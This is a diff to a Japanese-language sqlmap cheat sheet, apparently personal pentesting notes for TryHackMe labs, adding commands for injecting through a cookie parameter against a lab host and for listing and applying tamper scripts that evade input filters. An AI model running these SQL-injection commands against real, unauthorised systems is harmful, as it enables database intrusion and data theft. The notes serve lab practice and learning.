@@ -92,7 +92,26 @@ sqlmap -u "http://revenge.thm/products/1*" --batch
 ```
 
 ```sh
+# Cookie のパラメータを攻撃する例
+sqlmap -u "http://dog.thm/index.php" --cookie="id=100038288985085f5a6f59e4c358b6a3" --level=2
+```
+
+```sh
 # フィルター
 --where "id <= 100"
+```
+
+## タンパースクリプト
+
+一覧表示
+
+```sh
+sqlmap --list-tampers
+```
+
+タンパースクリプトを使用して実行
+
+```sh
+--tamper=<tamper-name>
 ```
 
